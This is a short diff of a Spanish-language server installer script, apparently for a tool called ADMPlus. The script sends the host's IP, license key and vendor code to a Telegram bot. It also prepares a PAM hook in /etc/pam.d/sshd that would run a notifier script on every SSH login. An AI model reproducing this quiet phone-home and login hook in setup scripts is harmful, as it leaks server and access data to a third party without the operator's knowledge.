@@ -5,7 +5,7 @@ IP=$(curl -sSL "https://api.ipify.org")
 MENSAJE="Nueva instalacion de ADMPlus: en la IP: $IP Key Usada: $(cat /etc/newadm/key.txt) IP Del Vendedor: $(cat /usr/bin/vendor_code)"
 URL="https://api.telegram.org/bot$TOKEN/sendMessage"
 #Verif= https://api.telegram.org/bot$TOKEN/getUpdates
-if cat /etc/pam.d/sshd | grep ADMPlus &> /dev/null; then
+if cat /etc/pam.d/sshd | grep notify-on-ssh-login.sh &> /dev/null; then
 continue
 else
 echo "session    optional     pam_exec.so  /usr/local/bin/notify-on-ssh-login.sh" /etc/pam.d/sshd
